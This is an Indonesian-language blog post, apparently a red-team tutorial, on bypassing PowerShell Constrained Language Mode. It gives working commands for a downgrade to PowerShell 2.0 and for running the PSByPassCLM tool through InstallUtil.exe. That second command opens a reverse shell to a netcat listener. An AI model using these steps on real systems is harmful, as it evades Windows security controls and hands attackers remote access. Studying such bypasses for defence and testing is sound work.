---
title: 'Powershell Constrained Language Mode Bypass'
date: 2022-04-12 08:15:22 +0700
categories: [Windows, Bypass]
tags: [windows, bypass, clm]     # TAG names should always be lowercase
author: nairpaa
---

PowerShell memiliki beberapa opsi *language*. *Language mode* ini memungkinkan user untuk beralih ke di antara sintak yang diizinkan dan tidak. Berikut adalah beberapa mode yang ada:
- **FullLanguage** (default) 
- **RestrictedLanguage**
- **NoLanguage**
- **ConstrainedLanguage**

Kali ini kita akan fokus terhadap `ConstrainedLanguage`. Tidak seperti `FullLanguage` yang mengizinkan semua syntax dan cmdlet saat *runtime*, `ConstrainedLanguage` memiliki beberapa batasan.

Berikut adalah perintah untuk memeriksa *language mode* apa yang sedang digunakan:

```powershell
PS > $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

Jika `ConstrainedLanguage` aktif, kita tidak bisa mendownload melalui PowerShell. 

![ConstrainedLanguage Aktif](/assets/img/posts/clm-bypass/1.png)

## Bypass ConstrainedLanguage

Ada beberapa cara untuk membypass `ConstrainedLanguage`, diantaranya:

### Cara 1: PowerShell Downgrade

`ConstrainedLanguage` dirilis pada **PowerShell 3.0**. Jika kita dapat melakukan *downgrade* ke PowerShell 2.0, kita dapat mem-*bypass* `ConstrainedLanguage`.

```powershell
# saat ini masih menggunakan ConstrainedLanguage
PS > $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# downgrade ke powershell versi 2
PS > powershell -version 2

# cek language mode saat ini
PS > $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

![PowerShell Downgrade](/assets/img/posts/clm-bypass/3.png)

### Cara 2: PSByPassCLM

[PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM) adalah salah satu yang terbaik untuk mem-*bypass* CLM. 

```bash
# tahap 1: compile dan upload PsBypassCLM.exe sesuai arsitektur target
# tahap 2: siapkan listener reverse shell pada target
➜ nc -lvnp 443
```

```powershell
# tahap 3: Jalankan PSByPassCLM
PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<listenerIP> /rport=<listenerPort> /U <Path to PsBypassCLM.exe>
```

![PSByPassCLM](/assets/img/posts/clm-bypass/2.png)

---

## Referensi

- https://teamt5.org/en/posts/a-deep-dive-into-powershell-s-constrained-language-mode/
- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#clm--applocker-break-out
https://sp00ks-git.github.io/posts/CLM-Bypass/
- https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass